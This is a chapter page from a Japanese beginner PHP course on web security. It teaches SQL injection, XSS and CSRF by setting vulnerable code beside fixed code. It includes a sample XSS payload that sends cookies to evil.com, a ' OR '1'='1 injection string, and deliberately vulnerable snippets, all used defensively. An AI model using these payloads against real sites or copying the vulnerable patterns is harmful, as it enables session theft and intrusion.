<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" id="viewport-meta">
    <title>PHP学習教材 第13章 - セキュリティの基礎</title>

    <!-- ダークモード早期適用（フラッシュ防止） -->
    <script>
        (function() {
            const saved = localStorage.getItem('darkMode');
            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
            if (saved === 'dark' || (saved === null && prefersDark)) {
                document.documentElement.classList.add('dark');
            }
        })();
    </script>

    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: {
                            50: '#eef2ff',
                            100: '#e0e7ff',
                            200: '#c7d2fe',
                            300: '#a5b4fc',
                            400: '#818cf8',
                            500: '#6366f1',
                            600: '#4f46e5',
                            700: '#4338ca',
                            800: '#3730a3',
                            900: '#312e81',
                        }
                    },
                    fontFamily: {
                        sans: ['"Noto Sans JP"', 'sans-serif'],
                    }
                }
            }
        }
    </script>

    <!-- Google Fonts - Noto Sans JP -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <!-- Highlight.js CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>

    <!-- Mermaid.js CDN -->
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>

    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <!-- カスタムスタイル -->
    <link rel="stylesheet" href="styles.css">
</head>
<body class="font-sans bg-slate-50 text-slate-800 antialiased">
    <!-- ヘッダー/ナビゲーションバー -->
    <header class="fixed top-0 left-0 right-0 z-50 text-white header-rich header-rich-shadow">
        <nav class="w-full px-4 sm:px-6 lg:px-8 relative z-10">
            <div class="flex items-center justify-between py-3">
                <!-- 左側: ロゴとタイトルセクション -->
                <div class="flex items-center gap-4">
                    <!-- アイコン -->
                    <div class="relative group">
                        <div class="absolute inset-0 bg-gradient-to-br from-yellow-400/30 to-orange-400/30 rounded-2xl blur-lg group-hover:blur-xl transition-all"></div>
                        <div class="relative w-14 h-14 bg-white/10 rounded-xl flex items-center justify-center backdrop-blur-sm border border-white/20">
                            <i class="fab fa-php text-3xl icon-rotate-hover drop-shadow-lg"></i>
                        </div>
                    </div>

                    <!-- タイトルとメタ情報 -->
                    <div class="flex flex-col gap-1">
                        <div class="flex items-center gap-2">
                            <span class="text-xl font-bold tracking-wide drop-shadow-md">PHP学習教材</span>
                            <span class="hidden sm:inline-flex items-center gap-1 px-2 py-0.5 bg-white/20 rounded-md text-[10px] font-semibold uppercase tracking-wider">
                                <i class="fas fa-star text-yellow-300 text-[8px]"></i>
                                初級
                            </span>
                        </div>
                        <div class="flex items-center gap-3 text-[11px] text-white/90 font-medium">
                            <div class="flex items-center gap-1">
                                <i class="fas fa-code text-[9px]"></i>
                                <span>プログラミング言語</span>
                            </div>
                            <div class="hidden sm:flex items-center gap-1">
                                <i class="fas fa-clock text-[9px]"></i>
                                <span>所要時間 約22時間</span>
                            </div>
                            <div class="hidden lg:flex items-center gap-1">
                                <i class="fas fa-language text-[9px]"></i>
                                <span>日本語</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 右側: サイドバートグルボタン -->
                <button id="sidebar-toggle-btn" class="w-10 h-10 flex items-center justify-center rounded-lg hover:bg-white/20 transition-all active:scale-95" title="サイドバーの表示/非表示">
                    <i class="fas fa-bars text-lg"></i>
                </button>
            </div>
        </nav>
    </header>

    <!-- メインレイアウト -->
    <div class="flex min-h-screen pt-20">
        <!-- サイドバーはsidebar-content.jsで動的に生成されます -->

        <!-- メインコンテンツ -->
        <main class="flex-1 min-w-0">
            <div class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-10 py-6">
                <!-- パンくずリスト -->
                <nav class="flex items-center gap-2 text-sm text-slate-500 mb-6">
                    <a href="https://fcircle-biz.github.io/tech_docs/" class="hover:text-primary-600 transition-colors">ホーム</a>
                    <i class="fas fa-chevron-right text-xs"></i>
                    <a href="../" class="hover:text-primary-600 transition-colors">PHP</a>
                    <i class="fas fa-chevron-right text-xs"></i>
                    <span class="text-slate-700">第13章</span>
                </nav>

                <!-- 章ヘッダー -->
                <header class="mb-6">
                    <div class="flex items-center gap-3 mb-2">
                        <span class="inline-flex items-center px-3 py-1 rounded-full text-sm font-medium
                                     bg-primary-100 text-primary-700">
                            第13章
                        </span>
                        <span class="text-sm text-slate-500">
                            <i class="fas fa-clock mr-1"></i>所要時間: 1.5時間
                        </span>
                    </div>
                    <h1 class="text-2xl sm:text-3xl font-bold text-slate-900 mb-2">セキュリティの基礎</h1>
                    <p class="text-slate-600">SQLインジェクション対策、XSS対策、CSRF対策など、Webアプリケーションのセキュリティ基礎知識を習得します。</p>
                </header>

                <!-- 学習目標カード -->
                <div class="bg-gradient-to-r from-amber-50 to-yellow-50 border border-amber-200
                            rounded-xl p-5 mb-6 overflow-hidden">
                    <div class="flex items-start gap-4">
                        <div class="flex-shrink-0 w-10 h-10 bg-amber-400 rounded-lg
                                    flex items-center justify-center">
                            <i class="fas fa-lightbulb text-white"></i>
                        </div>
                        <div>
                            <h2 class="text-lg font-semibold text-amber-800 mb-3">この章で学ぶこと</h2>
                            <ul class="space-y-2">
                                <li class="flex items-start gap-2 text-amber-900">
                                    <i class="fas fa-check-circle text-amber-500 mt-1 flex-shrink-0"></i>
                                    <span>Webアプリケーションにおけるセキュリティの重要性を理解する</span>
                                </li>
                                <li class="flex items-start gap-2 text-amber-900">
                                    <i class="fas fa-check-circle text-amber-500 mt-1 flex-shrink-0"></i>
                                    <span>SQLインジェクション攻撃の仕組みと対策方法を学ぶ</span>
                                </li>
                                <li class="flex items-start gap-2 text-amber-900">
                                    <i class="fas fa-check-circle text-amber-500 mt-1 flex-shrink-0"></i>
                                    <span>XSS（クロスサイトスクリプティング）攻撃の仕組みと対策方法を学ぶ</span>
                                </li>
                                <li class="flex items-start gap-2 text-amber-900">
                                    <i class="fas fa-check-circle text-amber-500 mt-1 flex-shrink-0"></i>
                                    <span>CSRF（クロスサイトリクエストフォージェリ）攻撃の仕組みと対策方法を学ぶ</span>
                                </li>
                                <li class="flex items-start gap-2 text-amber-900">
                                    <i class="fas fa-check-circle text-amber-500 mt-1 flex-shrink-0"></i>
                                    <span>その他の基本的なセキュリティ対策を知る</span>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>

                <!-- セクション 13.1 -->
                <section class="prose prose-slate max-w-none mb-8">
                    <h2 class="flex items-center gap-3 text-xl font-semibold text-slate-800
                               border-l-4 border-primary-500 pl-4 mb-4">
                        13.1 Webセキュリティの重要性
                    </h2>
                    <p class="text-slate-600 leading-relaxed mb-4">
                        Webアプリケーションを開発する上で、<strong>セキュリティ</strong>は最も重要な要素の一つです。
                        セキュリティ対策が不十分なアプリケーションは、悪意のある攻撃者によって情報が盗まれたり、システムが破壊されたりする危険性があります。
                    </p>

                    <div class="bg-red-50 border-l-4 border-red-500 p-4 my-6 rounded-r-lg">
                        <div class="flex items-start gap-3">
                            <i class="fas fa-exclamation-triangle text-red-600 mt-1"></i>
                            <div>
                                <p class="text-red-900 font-medium">セキュリティ被害の例</p>
                                <p class="text-red-800 text-sm mt-1">
                                    個人情報の流出、クレジットカード情報の不正利用、Webサイトの改ざん、サービスの停止など、
                                    セキュリティ対策が不十分だと深刻な被害が発生する可能性があります。
                                </p>
                            </div>
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">主な脅威の種類</h3>
                    <div class="bg-gradient-to-r from-slate-50 to-gray-50 border border-slate-200 rounded-xl p-5 my-6">
                        <div class="mermaid">
mindmap
  root((Webの脅威))
    データベース攻撃
      SQLインジェクション
      データ改ざん
    スクリプト攻撃
      XSS攻撃
      不正なコード実行
    権限悪用
      CSRF攻撃
      セッションハイジャック
    その他
      ファイルアップロード攻撃
      パスワード総当たり攻撃
                        </div>
                    </div>

                    <p class="text-slate-600 leading-relaxed mb-4">
                        この章では、PHPでWebアプリケーションを開発する際に最低限知っておくべき
                        <strong>基本的なセキュリティ対策</strong>について学びます。
                    </p>
                </section>

                <!-- セクション 13.2 -->
                <section class="prose prose-slate max-w-none mb-8">
                    <h2 class="flex items-center gap-3 text-xl font-semibold text-slate-800
                               border-l-4 border-primary-500 pl-4 mb-4">
                        13.2 SQLインジェクション対策
                    </h2>
                    <p class="text-slate-600 leading-relaxed mb-4">
                        <strong>SQLインジェクション</strong>は、データベースへの問い合わせ（SQL文）に悪意のあるコードを紛れ込ませる攻撃手法です。
                        攻撃が成功すると、データの漏洩、改ざん、削除などが行われる可能性があります。
                    </p>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">脆弱なコードの例</h3>
                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">❌ 危険なコード（SQLインジェクションの脆弱性あり）</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
// ユーザーからの入力をそのままSQL文に組み込む（危険！）
$username = $_POST['username'];
$password = $_POST['password'];

// 直接SQL文に変数を埋め込む（SQLインジェクションの危険性）
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);

// 悪意のある入力例: ' OR '1'='1
// → 全ユーザーのデータが取得されてしまう
?&gt;</code></pre>
                    </div>

                    <div class="bg-red-50 border-l-4 border-red-500 p-4 my-6 rounded-r-lg">
                        <div class="flex items-start gap-3">
                            <i class="fas fa-exclamation-triangle text-red-600 mt-1"></i>
                            <div>
                                <p class="text-red-900 font-medium">攻撃の例</p>
                                <p class="text-red-800 text-sm mt-1">
                                    ユーザー名に「<code>' OR '1'='1</code>」と入力されると、SQL文が
                                    <code>SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'</code> となり、
                                    条件が常に真になってしまいます。
                                </p>
                            </div>
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">正しい対策方法</h3>
                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">✅ 安全なコード（プリペアドステートメントを使用）</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
// PDOを使用したプリペアドステートメント
$username = $_POST['username'];
$password = $_POST['password'];

// プレースホルダーを使用したSQL文
$sql = "SELECT * FROM users WHERE username = :username AND password = :password";
$stmt = $pdo-&gt;prepare($sql);

// パラメータをバインド（自動的にエスケープされる）
$stmt-&gt;bindParam(':username', $username, PDO::PARAM_STR);
$stmt-&gt;bindParam(':password', $password, PDO::PARAM_STR);

// 実行
$stmt-&gt;execute();
?&gt;</code></pre>
                    </div>

                    <div class="bg-emerald-50 border-l-4 border-emerald-500 p-4 my-6 rounded-r-lg">
                        <div class="flex items-start gap-3">
                            <i class="fas fa-shield-alt text-emerald-600 mt-1"></i>
                            <div>
                                <p class="text-emerald-900 font-medium">プリペアドステートメントの利点</p>
                                <p class="text-emerald-800 text-sm mt-1">
                                    プリペアドステートメントを使うと、SQL文とデータが明確に分離され、
                                    ユーザー入力が自動的にエスケープされるため、SQLインジェクションを防ぐことができます。
                                </p>
                            </div>
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">SQLインジェクション対策のまとめ</h3>
                    <ul class="space-y-2 mb-4">
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>必ず<strong>プリペアドステートメント</strong>を使用する</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>ユーザー入力を<strong>直接SQL文に埋め込まない</strong></span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>入力値の<strong>バリデーション</strong>を行う</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>データベースユーザーの<strong>権限を最小限</strong>にする</span>
                        </li>
                    </ul>
                </section>

                <!-- セクション 13.3 -->
                <section class="prose prose-slate max-w-none mb-8">
                    <h2 class="flex items-center gap-3 text-xl font-semibold text-slate-800
                               border-l-4 border-primary-500 pl-4 mb-4">
                        13.3 XSS（クロスサイトスクリプティング）対策
                    </h2>
                    <p class="text-slate-600 leading-relaxed mb-4">
                        <strong>XSS（Cross-Site Scripting）</strong>は、Webページに悪意のあるスクリプトを埋め込む攻撃手法です。
                        攻撃が成功すると、Cookie情報の盗難、ページの改ざん、フィッシング攻撃などが可能になります。
                    </p>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">脆弱なコードの例</h3>
                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">❌ 危険なコード（XSSの脆弱性あり）</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
// ユーザーからの入力をそのまま出力（危険！）
$comment = $_POST['comment'];

// HTMLエスケープせずに出力
echo "&lt;p&gt;コメント: $comment&lt;/p&gt;";

// 悪意のある入力例: &lt;script&gt;alert('攻撃')&lt;/script&gt;
// → スクリプトが実行されてしまう
?&gt;</code></pre>
                    </div>

                    <div class="bg-red-50 border-l-4 border-red-500 p-4 my-6 rounded-r-lg">
                        <div class="flex items-start gap-3">
                            <i class="fas fa-exclamation-triangle text-red-600 mt-1"></i>
                            <div>
                                <p class="text-red-900 font-medium">攻撃の例</p>
                                <p class="text-red-800 text-sm mt-1">
                                    コメント欄に「<code>&lt;script&gt;document.location='http://evil.com/?cookie='+document.cookie&lt;/script&gt;</code>」と入力されると、
                                    訪問者のCookie情報が攻撃者のサーバーに送信されてしまいます。
                                </p>
                            </div>
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">正しい対策方法</h3>
                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">✅ 安全なコード（HTMLエスケープを使用）</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
// ユーザーからの入力を受け取る
$comment = $_POST['comment'];

// htmlspecialchars関数でHTMLエスケープ
$safe_comment = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');

// エスケープされた文字列を出力
echo "&lt;p&gt;コメント: $safe_comment&lt;/p&gt;";

// &lt;script&gt; → &amp;lt;script&amp;gt; に変換され、実行されない
?&gt;</code></pre>
                    </div>

                    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 my-6 rounded-r-lg">
                        <div class="flex items-start gap-3">
                            <i class="fas fa-lightbulb text-blue-600 mt-1"></i>
                            <div>
                                <p class="text-blue-900 font-medium">htmlspecialchars関数のパラメータ</p>
                                <p class="text-blue-800 text-sm mt-1">
                                    <strong>ENT_QUOTES</strong>: シングルクォートとダブルクォートの両方をエスケープ<br>
                                    <strong>'UTF-8'</strong>: 文字エンコーディングを指定（日本語対応）
                                </p>
                            </div>
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">XSS対策のまとめ</h3>
                    <ul class="space-y-2 mb-4">
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>ユーザー入力を出力する際は必ず<strong>htmlspecialchars関数</strong>でエスケープする</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>URLを出力する場合も適切にエスケープする</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>HTTPヘッダーで<strong>Content-Security-Policy</strong>を設定する</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>CookieにHttpOnlyフラグを設定する</span>
                        </li>
                    </ul>
                </section>

                <!-- セクション 13.4 -->
                <section class="prose prose-slate max-w-none mb-8">
                    <h2 class="flex items-center gap-3 text-xl font-semibold text-slate-800
                               border-l-4 border-primary-500 pl-4 mb-4">
                        13.4 CSRF（クロスサイトリクエストフォージェリ）対策
                    </h2>
                    <p class="text-slate-600 leading-relaxed mb-4">
                        <strong>CSRF（Cross-Site Request Forgery）</strong>は、ユーザーの意図しない操作を強制的に実行させる攻撃手法です。
                        ログイン中のユーザーが攻撃者の罠にかかると、本人が意図しない投稿や設定変更、商品購入などが行われてしまいます。
                    </p>

                    <div class="bg-gradient-to-r from-slate-50 to-gray-50 border border-slate-200 rounded-xl p-5 my-6">
                        <h3 class="text-lg font-semibold text-slate-800 mb-4 flex items-center gap-2">
                            <i class="fas fa-network-wired text-slate-600"></i>
                            CSRF攻撃の流れ
                        </h3>
                        <div class="mermaid">
sequenceDiagram
    participant U as ユーザー
    participant T as 正規サイト
    participant A as 攻撃サイト

    U->>T: ログイン（セッション確立）
    Note over U,T: ログイン状態を維持
    U->>A: 攻撃サイトを訪問
    A->>T: ユーザーになりすまして<br/>リクエストを送信
    T->>T: セッション有効のため<br/>処理を実行
    Note over T: パスワード変更など
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">脆弱なコードの例</h3>
                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">❌ 危険なコード（CSRF対策なし）</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
// delete.php - トークン検証なし（危険！）
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $post_id = $_POST['post_id'];

    // セッション確認のみでトークン検証なし
    if (isset($_SESSION['user_id'])) {
        // 投稿を削除（攻撃者が仕掛けたリクエストでも実行される）
        deletePost($post_id);
    }
}
?&gt;</code></pre>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">正しい対策方法</h3>
                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">✅ 安全なコード（CSRFトークンを使用）</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
// form.php - トークン生成
session_start();

// CSRFトークンを生成してセッションに保存
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?&gt;

&lt;form method="post" action="delete.php"&gt;
    &lt;input type="hidden" name="post_id" value="123"&gt;
    &lt;!-- CSRFトークンを埋め込む --&gt;
    &lt;input type="hidden" name="csrf_token" value="&lt;?php echo $_SESSION['csrf_token']; ?&gt;"&gt;
    &lt;button type="submit"&gt;削除&lt;/button&gt;
&lt;/form&gt;</code></pre>
                    </div>

                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">delete.php - トークン検証</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // CSRFトークンを検証
    if (!isset($_POST['csrf_token']) ||
        $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('不正なリクエストです');
    }

    // トークンが一致した場合のみ処理を実行
    $post_id = $_POST['post_id'];
    deletePost($post_id);
}
?&gt;</code></pre>
                    </div>

                    <div class="bg-emerald-50 border-l-4 border-emerald-500 p-4 my-6 rounded-r-lg">
                        <div class="flex items-start gap-3">
                            <i class="fas fa-shield-alt text-emerald-600 mt-1"></i>
                            <div>
                                <p class="text-emerald-900 font-medium">CSRFトークンの仕組み</p>
                                <p class="text-emerald-800 text-sm mt-1">
                                    フォーム表示時に生成したランダムなトークンをセッションとフォームの両方に保存し、
                                    送信時に両者が一致するかを検証します。攻撃者はセッション内のトークンを知ることができないため、攻撃を防げます。
                                </p>
                            </div>
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">CSRF対策のまとめ</h3>
                    <ul class="space-y-2 mb-4">
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>すべてのフォームに<strong>CSRFトークン</strong>を含める</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>データを変更する処理では必ず<strong>トークンを検証</strong>する</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>重要な操作では<strong>パスワード再入力</strong>を求める</span>
                        </li>
                        <li class="flex items-start gap-2 text-slate-600">
                            <i class="fas fa-check text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>SameSite Cookie属性を設定する</span>
                        </li>
                    </ul>
                </section>

                <!-- セクション 13.5 -->
                <section class="prose prose-slate max-w-none mb-8">
                    <h2 class="flex items-center gap-3 text-xl font-semibold text-slate-800
                               border-l-4 border-primary-500 pl-4 mb-4">
                        13.5 その他の基本的なセキュリティ対策
                    </h2>
                    <p class="text-slate-600 leading-relaxed mb-4">
                        SQL インジェクション、XSS、CSRF以外にも、Webアプリケーションには様々なセキュリティリスクがあります。
                        ここでは、その他の重要な対策について学びます。
                    </p>

                    <div class="grid md:grid-cols-2 gap-4 my-6">
                        <!-- 対策1 -->
                        <div class="bg-gradient-to-br from-blue-50 to-cyan-50 border border-blue-200 rounded-xl p-5">
                            <div class="flex items-start gap-3 mb-3">
                                <div class="w-10 h-10 bg-blue-500 rounded-lg flex items-center justify-center flex-shrink-0">
                                    <i class="fas fa-lock text-white"></i>
                                </div>
                                <h3 class="text-lg font-semibold text-blue-800">パスワードの安全な保存</h3>
                            </div>
                            <p class="text-blue-900 text-sm mb-3">
                                パスワードは必ず<strong>ハッシュ化</strong>して保存します。
                                平文（そのまま）での保存は絶対に行いません。
                            </p>
                            <div class="bg-blue-100 rounded-lg p-3">
                                <code class="text-xs text-blue-900">password_hash($password, PASSWORD_DEFAULT)</code>
                            </div>
                        </div>

                        <!-- 対策2 -->
                        <div class="bg-gradient-to-br from-emerald-50 to-teal-50 border border-emerald-200 rounded-xl p-5">
                            <div class="flex items-start gap-3 mb-3">
                                <div class="w-10 h-10 bg-emerald-500 rounded-lg flex items-center justify-center flex-shrink-0">
                                    <i class="fas fa-user-shield text-white"></i>
                                </div>
                                <h3 class="text-lg font-semibold text-emerald-800">セッション管理の強化</h3>
                            </div>
                            <p class="text-emerald-900 text-sm mb-3">
                                セッションIDの推測を困難にし、セッションハイジャックを防ぎます。
                            </p>
                            <div class="bg-emerald-100 rounded-lg p-3">
                                <code class="text-xs text-emerald-900">session_regenerate_id(true)</code>
                            </div>
                        </div>

                        <!-- 対策3 -->
                        <div class="bg-gradient-to-br from-purple-50 to-fuchsia-50 border border-purple-200 rounded-xl p-5">
                            <div class="flex items-start gap-3 mb-3">
                                <div class="w-10 h-10 bg-purple-500 rounded-lg flex items-center justify-center flex-shrink-0">
                                    <i class="fas fa-file-upload text-white"></i>
                                </div>
                                <h3 class="text-lg font-semibold text-purple-800">ファイルアップロードの制限</h3>
                            </div>
                            <p class="text-purple-900 text-sm">
                                アップロード可能なファイルの種類、サイズ、保存場所を制限し、
                                悪意のあるファイルの実行を防ぎます。
                            </p>
                        </div>

                        <!-- 対策4 -->
                        <div class="bg-gradient-to-br from-orange-50 to-amber-50 border border-orange-200 rounded-xl p-5">
                            <div class="flex items-start gap-3 mb-3">
                                <div class="w-10 h-10 bg-orange-500 rounded-lg flex items-center justify-center flex-shrink-0">
                                    <i class="fas fa-eye-slash text-white"></i>
                                </div>
                                <h3 class="text-lg font-semibold text-orange-800">エラーメッセージの制御</h3>
                            </div>
                            <p class="text-orange-900 text-sm">
                                本番環境では詳細なエラーメッセージを表示せず、
                                システム情報の漏洩を防ぎます。
                            </p>
                        </div>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3">パスワードハッシュ化の実装例</h3>
                    <div class="code-block-wrapper">
                        <div class="code-block-header">
                            <span class="code-block-title">パスワードの安全な保存と検証</span>
                            <button class="code-copy-btn" onclick="copyCode(this)">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        <pre><code class="language-php">&lt;?php
// ユーザー登録時: パスワードをハッシュ化して保存
$password = $_POST['password'];
$hashed_password = password_hash($password, PASSWORD_DEFAULT);

// データベースに保存
$sql = "INSERT INTO users (username, password) VALUES (:username, :password)";
$stmt = $pdo-&gt;prepare($sql);
$stmt-&gt;execute(['username' =&gt; $username, 'password' =&gt; $hashed_password]);

// ログイン時: パスワードを検証
$input_password = $_POST['password'];
$sql = "SELECT password FROM users WHERE username = :username";
$stmt = $pdo-&gt;prepare($sql);
$stmt-&gt;execute(['username' =&gt; $username]);
$user = $stmt-&gt;fetch();

if (password_verify($input_password, $user['password'])) {
    echo "ログイン成功";
} else {
    echo "パスワードが違います";
}
?&gt;</code></pre>
                    </div>

                    <h3 class="text-lg font-semibold text-slate-800 mb-3 mt-6">セキュリティ対策のチェックリスト</h3>
                    <div class="bg-gradient-to-r from-slate-50 to-gray-50 border border-slate-200 rounded-xl p-5">
                        <ul class="space-y-2">
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>データベースクエリは<strong>プリペアドステートメント</strong>を使用</span>
                            </li>
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>ユーザー入力の出力は<strong>htmlspecialchars</strong>でエスケープ</span>
                            </li>
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>フォームには<strong>CSRFトークン</strong>を含める</span>
                            </li>
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>パスワードは<strong>password_hash</strong>でハッシュ化</span>
                            </li>
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>HTTPS（SSL/TLS）を使用して通信を暗号化</span>
                            </li>
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>本番環境ではエラー表示を無効化</span>
                            </li>
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>ファイルアップロード機能には厳格な制限を設ける</span>
                            </li>
                            <li class="flex items-start gap-2 text-slate-700">
                                <i class="fas fa-check-square text-emerald-500 mt-1 flex-shrink-0"></i>
                                <span>セッションIDは定期的に再生成</span>
                            </li>
                        </ul>
                    </div>
                </section>

                <!-- 実習課題 -->
                <div class="bg-gradient-to-r from-purple-50 to-fuchsia-50 border border-purple-200
                            rounded-xl p-5 my-8 overflow-hidden">
                    <div class="flex items-start gap-4">
                        <div class="flex-shrink-0 w-10 h-10 bg-purple-500 rounded-lg
                                    flex items-center justify-center">
                            <i class="fas fa-laptop-code text-white"></i>
                        </div>
                        <div class="flex-1 min-w-0">
                            <h3 class="text-lg font-semibold text-purple-800 mb-4 break-words">実習課題</h3>
                            <div class="space-y-4">
                                <div>
                                    <p class="font-medium text-purple-900 mb-2 break-words">課題1: セキュアなログインフォームの作成</p>
                                    <p class="text-purple-800 text-sm break-words">
                                        以下の要件を満たすログインフォームを作成してください：<br>
                                        1. CSRFトークンによる保護<br>
                                        2. パスワードのハッシュ化<br>
                                        3. XSS対策（入力値のエスケープ）<br>
                                        4. セッションIDの再生成
                                    </p>
                                </div>
                                <div>
                                    <p class="font-medium text-purple-900 mb-2 break-words">課題2: セキュアなコメント投稿機能</p>
                                    <p class="text-purple-800 text-sm break-words">
                                        以下のセキュリティ対策を実装したコメント投稿機能を作成してください：<br>
                                        1. SQLインジェクション対策（プリペアドステートメント）<br>
                                        2. XSS対策（コメント表示時のエスケープ）<br>
                                        3. CSRF対策（トークン検証）<br>
                                        4. 入力値のバリデーション
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 理解度確認クイズ -->
                <div class="bg-gradient-to-r from-blue-50 to-cyan-50 border border-blue-200
                            rounded-xl p-5 my-8 overflow-hidden">
                    <div class="flex items-start gap-4">
                        <div class="flex-shrink-0 w-10 h-10 bg-blue-500 rounded-lg
                                    flex items-center justify-center">
                            <i class="fas fa-question text-white"></i>
                        </div>
                        <div class="flex-1 min-w-0">
                            <h3 class="text-lg font-semibold text-blue-800 mb-4 break-words">理解度確認クイズ</h3>
                            <ol class="space-y-4">
                                <li class="text-blue-900">
                                    <p class="font-medium mb-2 break-words">Q1. SQLインジェクション対策として最も効果的な方法は何ですか？</p>
                                    <details class="mt-2">
